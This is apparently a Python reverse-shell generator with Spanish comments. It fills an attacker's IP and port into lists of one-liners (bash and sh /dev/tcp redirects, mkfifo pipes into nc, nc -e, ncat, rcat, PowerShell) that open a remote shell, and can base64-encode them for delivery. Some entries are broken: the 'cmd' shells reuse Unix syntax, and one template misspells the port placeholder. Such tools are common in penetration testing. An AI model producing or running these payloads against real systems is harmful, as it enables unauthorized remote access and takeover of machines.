import argparse, base64
from colorama import init, Fore, Style

# Confihgurar los colores
init()
GREEN = Fore.GREEN
RED = Fore.RED
BLUE = Fore.BLUE
CYAN = Fore.CYAN
RESET = Fore.RESET

#   Configurar parametros para el script
parser = argparse.ArgumentParser(description='generar shells')
parser.add_argument('-i', '--ip', required=True, help='IP del servidor')
parser.add_argument('-p', '--port', required=True, help='Puerto del servidor')
parser.add_argument('--type', choices=['bash', 'sh', 'cmd', 'powershell'], help='Tipo de shell a filtrar')
parser.add_argument('-r', '--full_path', action='store_true', help='Aregar la ruta completa de las shells')
parser.add_argument('-d', '--decode', action='store_true', help='codificar a base64')
parser.add_argument('-l', '--lista',  type=int, default=3, help='limitar los resultados entregados')
args = parser.parse_args()

# Funciones para las shells

def bash_shells(ip, port, full, limint):
    bash_full = [
           '/bin/bash -i >& /dev/tcp/{ip}/{port} 0>&1',
           '0<&196;exec 196<>/dev/tcp/{ip}/{port}; /bin/bash <&196 >&196 2>&196',
           'exec 5<>/dev/tcp/{ip}/{port};cat <&5 | while read line; do $line 2>&5 >&5; done',
           '/bin/bash -i 5<> /dev/tcp/{ip}/{port} 0<&5 1>&5 2>&5',
           '/bin/bash -i >& /dev/udp/{ip}/{port} 0>&1',
           'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc {ip} {port} >/tmp/f',
           'nc {ip} {port} -e /bin/bash',
           'nc -c /bin/bash {ip} {port}',
           'ncat {ip} {port} -e /bin/bash',
           'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|ncat -u {ip} {port} >/tmp/f',
           'rcat {ip} {port} -r /bin/bash'
        ]
    bash = [
            'bash -i >& /dev/tcp/{ip}/{port} 0>&1',
            '0<&196;exec 196<>/dev/tcp/{ip}/{port}; bash <&196 >&196 2>&196',
            'exec 5<>/dev/tcp/{ip}/{port};cat <&5 | while read line; do $line 2>&5 >&5; done',
            'bash -i 5<> /dev/tcp/{ip}/{port} 0<&5 1>&5 2>&5',
            'bash -i >& /dev/udp/{ip}/{port} 0>&1',
            'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc {ip} {port} >/tmp/f',
            'nc {ip} {port} -e bash',
            'nc -c bash {ip} {port}',
            'ncat {ip} {port} -e bash',
            'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|ncat -u {ip} {port} >/tmp/f',
            'rcat {ip} {port} -r bash'
        ]

    if full:
        if limint:
            return bash_full[:limint]
        else:
            return bash_full
    else:
        if limint:
            return bash[:limint]
        else:
            return bash

def sh_shells(ip, port, full, limit):
    sh_full = [
            '/bin/sh -i >& /dev/tcp/{ip}/{port} 0>&1',
            '0<&196;exec 196<>/dev/tcp/{ip}/{port}; /bin/sh <&196 >&196 2>&196',
            'exec 5<>/dev/tcp/{ip}/{port};cat <&5 | while read line; do $line 2>&5 >&5; done',
            '/bin/sh -i 5<> /dev/tcp/{ip}/{port} 0<&5 1>&5 2>&5',
            '/bin/sh -i >& /dev/udp/{ip}/{port} 0>&1',
            'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f',
            'nc {ip} {port} -e /bin/sh',
            'nc -c /bin/sh {ip} {port}',
            'ncat {ip} {port} -e /bin/sh',
            'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|ncat -u {ip} {port} >/tmp/f',
            'rcat {ip} {port} -r /bin/sh'
        ]
    sh = [
            'sh -i >& /dev/tcp/{ip}/{port} 0>&1',
            '0<&196;exec 196<>/dev/tcp/{ip}/{port}; sh <&196 >&196 2>&196',
            'exec 5<>/dev/tcp/{ip}/{port};cat <&5 | while read line; do $line 2>&5 >&5; done',
            'sh -i 5<> /dev/tcp/{ip}/{port} 0<&5 1>&5 2>&5',
            'sh -i >& /dev/udp/{ip}/{potr} 0>&1',
            'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc {ip} {port} >/tmp/f',
            'nc {ip} {port} -e sh',
            'nc -c sh {ip} {port}',
            'ncat {ip} {port} -e sh',
            'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|ncat -u {ip} {port} >/tmp/f',
            'rcat {ip} {port} -r sh'
        ]

    if full:
        if limit:
            return sh_full[:limit]
        else:
            return sh_full
    else:
        if limit:
            return sh[:limit]
        else:
            return sh

    
def cmd_shells(ip, port, limit):
    cmd = [
        'cmd -i >& /dev/tcp/{ip}/{port} 0>&1',
        '0<&196;exec 196<>/dev/tcp/{ip}/{port}; cmd <&196 >&196 2>&196',
        'exec 5<>/dev/tcp/{ip}/{port};cat <&5 | while read line; do $line 2>&5 >&5; done',
        'cmd -i 5<> /dev/tcp/{ip}/{port} 0<&5 1>&5 2>&5',
        'cmd -i >& /dev/udp/{ip}/{port} 0>&1',
        'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|cmd -i 2>&1|nc {ip} {port} >/tmp/f',
        'nc {ip} {port} -e cmd',
        'nc -c cmd {ip} {port}',
        'ncat {ip} {port} -e cmd',
        'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|cmd -i 2>&1|ncat -u {ip} {port} >/tmp/f',
        'rcat {ip} {port} -r cmd'
    ]
    if limit:
        return cmd[:limit]
    else: return cmd

def powershell_shells(ip, port, limit):
    powershell = [
        'ncat.exe {ip} {port} -e powershell',
        'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|powershell -i 2>&1|ncat -u {ip} {port} >/tmp/f',
        'rcat {ip} {port} -r powershell'
    ]

    if limit:
        return powershell[:limit]
    else:
        return powershell

def encode_shells(result):
    encode = base64.b64encode(result.encode('utf-8')).decode('utf-8')
    return encode

# Reemplazar IP y puerto en cada shell y mostrar el resultado
ip_shell = args.ip
port_shell = args.port
full = args.full_path
encoded = args.decode
lista = args.lista

if args.type == 'bash':
    shells = bash_shells(ip_shell, port_shell, full, lista)
elif args.type == 'sh':
    shells = sh_shells(ip_shell, port_shell, full, lista)
elif args.type == 'cmd':
    shells = cmd_shells(ip_shell, port_shell, lista)
elif args.type == 'powershell':
    shells = powershell_shells(ip_shell, port_shell, lista)
else:
    shells = sh_shells(ip_shell, port_shell, full, lista) + \
        bash_shells(ip_shell, port_shell, full, lista)


if encoded:
    for shell in shells:
        print('\n')
        encoded_shell = encode_shells(shell.replace('{ip}', ip_shell).replace('{port}', port_shell))
        result = GREEN + '[+] ' + RESET + shell.replace('{ip}', RED + ip_shell + RESET).replace('{port}', BLUE + port_shell + RESET)
        print(result)
        print(CYAN + '   Encoded: ' + RESET + encoded_shell + '\n')
else:
    for shell in shells:
        print('\n')
        print(GREEN + '[+] ' + RESET + shell.replace('{ip}', RED + ip_shell + RESET).replace('{port}', BLUE + port_shell + RESET) + '\n')